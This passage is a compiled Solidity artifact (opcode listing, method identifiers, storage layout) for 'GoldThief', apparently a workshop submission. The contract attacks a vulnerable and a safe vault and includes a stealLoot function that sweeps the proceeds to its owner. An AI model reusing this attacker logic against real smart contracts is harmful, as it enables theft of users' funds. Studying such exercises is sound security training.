PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x710957CC PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x16D JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x17F JUMPI RETURNDATASIZE PUSH0 PUSH0 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP JUMPDEST PUSH1 0x3 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH1 0xFF AND ISZERO PUSH2 0x214 JUMPI PUSH0 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x7FD42617 PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x1FD JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x20F JUMPI RETURNDATASIZE PUSH0 PUSH0 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP JUMPDEST STOP JUMPDEST PUSH0 PUSH0 REVERT JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x225 JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP PUSH2 0x22E PUSH2 0x316 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x23B SWAP2 SWAP1 PUSH2 0x8E9 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x24F JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP PUSH2 0x258 PUSH2 0x31D JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x265 SWAP2 SWAP1 PUSH2 0x97C JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x279 JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP PUSH2 0x282 PUSH2 0x341 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x28F SWAP2 SWAP1 PUSH2 0x8E9 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x2A0 PUSH2 0x347 JUMP JUMPDEST STOP JUMPDEST PUSH2 0x2AA PUSH2 0x53C JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x2B7 JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP PUSH2 0x2C0 PUSH2 0x730 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x2CD SWAP2 SWAP1 PUSH2 0x9AF JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x2E1 JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP PUSH2 0x2EA PUSH2 0x742 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x2F7 SWAP2 SWAP1 PUSH2 0x9E8 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x30B JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP PUSH2 0x314 PUSH2 0x767 JUMP JUMPDEST STOP JUMPDEST PUSH0 SELFBALANCE SWAP1 POP SWAP1 JUMP JUMPDEST PUSH0 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH1 0x2 SLOAD DUP2 JUMP JUMPDEST PUSH1 0x1 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ PUSH2 0x3D6 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x3CD SWAP1 PUSH2 0xA5B JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH8 0xDE0B6B3A7640000 CALLVALUE LT ISZERO PUSH2 0x421 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x418 SWAP1 PUSH2 0xAC3 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x1 PUSH1 0x3 PUSH0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH1 0xFF MUL NOT AND SWAP1 DUP4 ISZERO ISZERO MUL OR SWAP1 SSTORE POP PUSH0 PUSH1 0x2 DUP2 SWAP1 SSTORE POP PUSH0 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xD0E30DB0 CALLVALUE PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x4A8 JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x4BA JUMPI RETURNDATASIZE PUSH0 PUSH0 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP POP PUSH0 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x7FD42617 PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x524 JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x536 JUMPI RETURNDATASIZE PUSH0 PUSH0 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH1 0x1 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ PUSH2 0x5CB JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x5C2 SWAP1 PUSH2 0xA5B JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH8 0xDE0B6B3A7640000 CALLVALUE LT ISZERO PUSH2 0x616 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x60D SWAP1 PUSH2 0xB2B JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH0 PUSH1 0x3 PUSH0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH1 0xFF MUL NOT AND SWAP1 DUP4 ISZERO ISZERO MUL OR SWAP1 SSTORE POP PUSH0 PUSH1 0x2 DUP2 SWAP1 SSTORE POP PUSH0 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xD0E30DB0 CALLVALUE PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x69C JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x6AE JUMPI RETURNDATASIZE PUSH0 PUSH0 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP POP PUSH0 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x710957CC PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x718 JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x72A JUMPI RETURNDATASIZE PUSH0 PUSH0 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH1 0x3 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH1 0xFF AND DUP2 JUMP JUMPDEST PUSH1 0x1 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH1 0x1 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ PUSH2 0x7F6 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x7ED SWAP1 PUSH2 0xA5B JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x1 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0x8FC SELFBALANCE SWAP1 DUP2 ISZERO MUL SWAP1 PUSH1 0x40 MLOAD PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP9 CALL SWAP4 POP POP POP POP ISZERO DUP1 ISZERO PUSH2 0x85A JUMPI RETURNDATASIZE PUSH0 PUSH0 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH0 MSTORE PUSH1 0x11 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH0 REVERT JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x89D DUP3 PUSH2 0x88A JUMP JUMPDEST SWAP2 POP PUSH32 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 SUB PUSH2 0x8CF JUMPI PUSH2 0x8CE PUSH2 0x85D JUMP JUMPDEST JUMPDEST PUSH1 0x1 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x8E3 DUP2 PUSH2 0x88A JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x8FC PUSH0 DUP4 ADD DUP5 PUSH2 0x8DA JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x944 PUSH2 0x93F PUSH2 0x93A DUP5 PUSH2 0x902 JUMP JUMPDEST PUSH2 0x921 JUMP JUMPDEST PUSH2 0x902 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x955 DUP3 PUSH2 0x92A JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x966 DUP3 PUSH2 0x94B JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x976 DUP2 PUSH2 0x95C JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x98F PUSH0 DUP4 ADD DUP5 PUSH2 0x96D JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 DUP2 ISZERO ISZERO SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x9A9 DUP2 PUSH2 0x995 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x9C2 PUSH0 DUP4 ADD DUP5 PUSH2 0x9A0 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH2 0x9D2 DUP3 PUSH2 0x902 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x9E2 DUP2 PUSH2 0x9C8 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x9FB PUSH0 DUP4 ADD DUP5 PUSH2 0x9D9 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 DUP3 DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x4F6E6C79206F776E657200000000000000000000000000000000000000000000 PUSH0 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH0 PUSH2 0xA45 PUSH1 0xA DUP4 PUSH2 0xA01 JUMP JUMPDEST SWAP2 POP PUSH2 0xA50 DUP3 PUSH2 0xA11 JUMP JUMPDEST PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH0 DUP4 ADD MSTORE PUSH2 0xA72 DUP2 PUSH2 0xA39 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 0x4E656564206174206C6561737420312045544800000000000000000000000000 PUSH0 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH0 PUSH2 0xAAD PUSH1 0x13 DUP4 PUSH2 0xA01 JUMP JUMPDEST SWAP2 POP PUSH2 0xAB8 DUP3 PUSH2 0xA79 JUMP JUMPDEST PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH0 DUP4 ADD MSTORE PUSH2 0xADA DUP2 PUSH2 0xAA1 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 0x4E656564206174206C6561737420312045544820746F2061747461636B000000 PUSH0 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH0 PUSH2 0xB15 PUSH1 0x1D DUP4 PUSH2 0xA01 JUMP JUMPDEST SWAP2 POP PUSH2 0xB20 DUP3 PUSH2 0xAE1 JUMP JUMPDEST PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH0 DUP4 ADD MSTORE PUSH2 0xB42 DUP2 PUSH2 0xB09 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 PUSH32 0x3DBEADFAB9C3E7314CE7D397E314B457A476D296768E6A30651D8FC7798BC964 PUSH20 0x6F6C634300081E00330000000000000000000000 "
				},
				"gasEstimates": {
					"creation": {
						"codeDepositCost": "588600",
						"executionCost": "infinite",
						"totalCost": "infinite"
					},
					"external": {
						"attackCount()": "2470",
						"attackSafe()": "infinite",
						"attackVulnerable()": "infinite",
						"attackingSafe()": "2488",
						"getBalance()": "335",
						"owner()": "2552",
						"stealLoot()": "infinite",
						"targetVault()": "infinite"
					}
				},
				"methodIdentifiers": {
					"attackCount()": "407c2821",
					"attackSafe()": "494eba64",
					"attackVulnerable()": "67a3fde8",
					"attackingSafe()": "71cb791a",
					"getBalance()": "12065fe0",
					"owner()": "8da5cb5b",
					"stealLoot()": "cff53a4a",
					"targetVault()": "1f92db45"
				}
			},
			"storageLayout": {
				"storage": [
					{
						"astId": 14,
						"contract": "submissions/Zora/GoldThief.sol:GoldThief",
						"label": "targetVault",
						"offset": 0,
						"slot": "0",
						"type": "t_contract(IVault)11"
					},
					{
						"astId": 16,
						"contract": "submissions/Zora/GoldThief.sol:GoldThief",
						"label": "owner",
						"offset": 0,
						"slot": "1",
						"type": "t_address"
					},
					{
						"astId": 18,
						"contract": "submissions/Zora/GoldThief.sol:GoldThief",
						"label": "attackCount",
						"offset": 0,
						"slot": "2",
						"type": "t_uint256"
					},
					{
						"astId": 20,
						"contract": "submissions/Zora/GoldThief.sol:GoldThief",
						"label": "attackingSafe",
						"offset": 0,
						"slot": "3",
						"type": "t_bool"
					}
				],
				"types": {
					"t_address": {
						"encoding": "inplace",
						"label": "address",
						"numberOfBytes": "20"
					},
					"t_bool": {
						"encoding": "inplace",
						"label": "bool",
						"numberOfBytes": "1"
					},
					"t_contract(IVault)11": {
						"encoding": "inplace",
						"label": "contract IVault",
						"numberOfBytes": "20"
					},
					"t_uint256": {
						"encoding": "inplace",
						"label": "uint256",
						"numberOfBytes": "32"
					}
				}
			},
			"userdoc": {
				"kind": "user",
				"methods": {},
				"version": 1
			}
		}
	}
}